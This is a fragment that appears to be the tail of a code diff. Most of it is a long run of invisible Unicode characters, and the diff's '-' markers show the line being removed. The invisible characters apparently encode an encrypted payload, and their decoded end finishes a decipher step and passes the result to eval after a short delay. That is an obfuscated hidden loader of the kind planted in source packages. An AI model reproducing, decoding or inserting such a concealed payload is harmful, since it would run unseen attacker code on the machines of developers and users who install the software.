󠅒󠅓󠄡󠄠󠅖󠄣󠄥󠅑󠅕󠄣󠅑󠅖󠅖󠄣󠄩󠄩󠅖󠄣󠅖󠅑󠄡󠅒󠅕󠄩󠄥󠄢󠅓󠄣󠄠󠄦󠅓󠅖󠄩󠄧󠄣󠅒󠄧󠅔󠅒󠄢󠄧󠄣󠅕󠄢󠄧󠄣󠄦󠄧󠅖󠄩󠄢󠅒󠅕󠄢󠅖󠅑󠄧󠅒󠄥󠄨󠅖󠄧󠄥󠄦󠅕󠄡󠅕󠅒󠄢󠄠󠄦󠄩󠅕󠅑󠅒󠄥󠄧󠄣󠄠󠅒󠄣󠄩󠄩󠅒󠅑󠅒󠅓󠅖󠄩󠅔󠄩󠄥󠄤󠄧󠄥󠄩󠄢󠅑󠅑󠅓󠅑󠄣󠄤󠄧󠅔󠄢󠄥󠅑󠅑󠄨󠄠󠄧󠅔󠅑󠄣󠄣󠅔󠄣󠄩󠅕󠄣󠅑󠄥󠄩󠄤󠄤󠅔󠅔󠄩󠅑󠅕󠄤󠅖󠅖󠅕󠅒󠅔󠄤󠅒󠄥󠄧󠄤󠅕󠅑󠅔󠅔󠄣󠅖󠅓󠄨󠅓󠅒󠅓󠄨󠄠󠄩󠄣󠅕󠄠󠄩󠄧󠅖󠄡󠄡󠅑󠄡󠄦󠄥󠅓󠄣󠄨󠅖󠅖󠄩󠄩󠄨󠄦󠄥󠅔󠅕󠅔󠄥󠅕󠄤󠄨󠄡󠄠󠄣󠄨󠄡󠄣󠅔󠅒󠄩󠄩󠅕󠄠󠄩󠄧󠅕󠅔󠄥󠄢󠄥󠄨󠄥󠄢󠄦󠄥󠅒󠅖󠄠󠅖󠅒󠄡󠄡󠄠󠄣󠅔󠅖󠅒󠄦󠅔󠅒󠅔󠄢󠄤󠄥󠅑󠅑󠄢󠅕󠄧󠄠󠅒󠅔󠅖󠅑󠄩󠅑󠄢󠄥󠅕󠄤󠅕󠅒󠅒󠄠󠄢󠄢󠅖󠄧󠄢󠄤󠄢󠅓󠅓󠅓󠄩󠅒󠅒󠄩󠅑󠄡󠅕󠅒󠄦󠅖󠄨󠅕󠄣󠅓󠄨󠄥󠄢󠅒󠅕󠄢󠄤󠄧󠄤󠄣󠄥󠄧󠄦󠅓󠄣󠅓󠄡󠄦󠅕󠅕󠄣󠅓󠄩󠄢󠅒󠄦󠄤󠅖󠅑󠄤󠅔󠄧󠄣󠄡󠄣󠅕󠄥󠄧󠅕󠄤󠄤󠅑󠅒󠄤󠅒󠅔󠅖󠄦󠄧󠅓󠅕󠅔󠄦󠅔󠅒󠅓󠅒󠄥󠅕󠄡󠄠󠄩󠄤󠄥󠄤󠄡󠄠󠄠󠄥󠄦󠅒󠄢󠄦󠄣󠅕󠄧󠄧󠅔󠄧󠄥󠄢󠄦󠄦󠄦󠄠󠅕󠅑󠄣󠄧󠅒󠄥󠄣󠅒󠅓󠄤󠄡󠄩󠄦󠄩󠅕󠄥󠄦󠄥󠄠󠄠󠄢󠄢󠄦󠄥󠅖󠅓󠅖󠅑󠅑󠄨󠄥󠅕󠄠󠅖󠄩󠄗󠄜󠄗󠅘󠅕󠅨󠄗󠄜󠄗󠅥󠅤󠅖󠄨󠄗󠄙󠄫󠅒󠄛󠄭󠅔󠄞󠅖󠅙󠅞󠅑󠅜󠄘󠄗󠅥󠅤󠅖󠄨󠄗󠄙󠄫󠅩󠅙󠅕󠅜󠅔󠄐󠅞󠅕󠅧󠄐󠅀󠅢󠅟󠅝󠅙󠅣󠅕󠄘󠅢󠄭󠄮󠅣󠅕󠅤󠅄󠅙󠅝󠅕󠅟󠅥󠅤󠄘󠅢󠄜󠄥󠄠󠄠󠄙󠄙󠄫󠅩󠅙󠅕󠅜󠅔󠄐󠅕󠅦󠅑󠅜󠄘󠅒󠄙󠄫󠅭󠄙󠄘󠄙󠅍󠅋󠄠󠅍󠄞󠅤󠅘󠅕󠅞󠄘󠄘󠄙󠄭󠄮󠅫󠅭󠄙󠄫`,
-    ),
-  ).toString("utf-8"),
-);
